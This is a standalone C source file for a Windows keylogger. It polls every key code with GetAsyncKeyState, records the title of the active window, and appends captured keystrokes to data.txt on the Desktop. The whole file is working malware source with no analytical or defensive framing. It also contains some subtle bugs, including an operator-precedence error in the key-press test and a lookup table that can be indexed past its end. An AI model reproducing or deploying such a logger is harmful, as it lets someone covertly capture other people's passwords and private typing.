// GetAsyncKeyState user32.dll
// SetWindowsHookExA user32.dll
#include <Windows.h>
#include <stdio.h>

#define MAX_BUFFER_SIZE 1024
#define MAX_NAME_SIZE 256

CHAR previous[MAX_NAME_SIZE];

VOID WriteLog(CHAR *data, CHAR *path) {
    DWORD dwBytes = 0;
    HANDLE hFile = CreateFile(path, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(hFile, data, strlen(data), &dwBytes, NULL);
    CloseHandle(hFile);
}

int main() {

    CHAR *charset[] = {"", "", "", "", "", "", "", "", "[backspace]", "[tab]", "", "", "", "[enter]", "", "", "", "[ctrl]", "[alt]", "", "[caps lock]", "", "", "", "", "", "", "[esc]", "", "", "", "", "[spacebar]", "[page up]", "[page down]", "", "", "", "", "", "", "", "", "", "[print screen]", "[insert]", "[delete]", "" };
    CHAR buffer[MAX_BUFFER_SIZE];
    CHAR current[MAX_NAME_SIZE];

    DWORD key = 0;
    while(TRUE) {
        for(key = 0; key <= 256; key++) {
            SHORT pressed = GetAsyncKeyState(key);
            SHORT caps = 1;
            if(pressed & 0x8001 == 0x8001) {
                HWND hWindow = GetForegroundWindow();
                GetWindowText(hWindow, current, MAX_NAME_SIZE);

                if(!strcmp(previous, current) == 0) {
                    strncpy(previous, current, MAX_NAME_SIZE);
                    snprintf(buffer, MAX_BUFFER_SIZE, "%s\n----------------------------------\n", previous);
                    WriteLog(buffer, "C:\\users\\dev\\Desktop\\data.txt");
                }

                if(GetAsyncKeyState(VK_CAPITAL)) {
                    caps = 0;
                }
                if(GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
                    caps = 0;
                }

                if(key <= 0x2f) {
                    snprintf(buffer, MAX_BUFFER_SIZE, "%s", charset[key]);
                    WriteLog(buffer, "C:\\users\\dev\\Desktop\\data.txt");
                }

                if(key >= 0x30 && key <= 0x39) {
                    snprintf(buffer, MAX_BUFFER_SIZE, "%d",key - 0x30);
                    WriteLog(buffer, "C:\\users\\dev\\Desktop\\data.txt");
                }

                if(key >= 0x41 && key <= 0x5A) {
                    snprintf(buffer, MAX_BUFFER_SIZE, "%c", key + (32 * caps));
                    WriteLog(buffer, "C:\\users\\dev\\Desktop\\data.txt");        
                }

            }
        }
    }
    return 0;
}
